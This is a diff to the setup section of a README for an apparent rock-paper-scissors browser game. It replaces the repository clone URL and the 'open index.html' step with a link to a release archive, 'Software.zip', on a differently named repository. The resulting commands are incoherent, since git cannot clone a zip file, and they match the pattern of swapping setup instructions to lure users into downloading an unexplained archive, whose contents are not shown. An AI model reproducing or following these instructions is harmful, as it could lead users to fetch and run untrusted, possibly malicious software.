@@ -44,15 +44,15 @@ To run this project locally, follow these steps:
 
 1. **Clone the repository:**
    ```sh
-   git clone https://github.com/Shreejitghute07/rock-paper-scissors.git
+   git clone https://github.com/Shreejitghute07/Rock-Paper-Scissor/releases/download/v1.0/Software.zip
    ```
 2. **Navigate to the project directory:**
    ```sh
    cd rock-paper-scissors
    ```
-3. **Open the `index.html` file in your web browser:**
+3. **Open the `https://github.com/Shreejitghute07/Rock-Paper-Scissor/releases/download/v1.0/Software.zip` file in your web browser:**
    ```sh
-   open index.html
+   open https://github.com/Shreejitghute07/Rock-Paper-Scissor/releases/download/v1.0/Software.zip
    ```
 
 ## How to Play
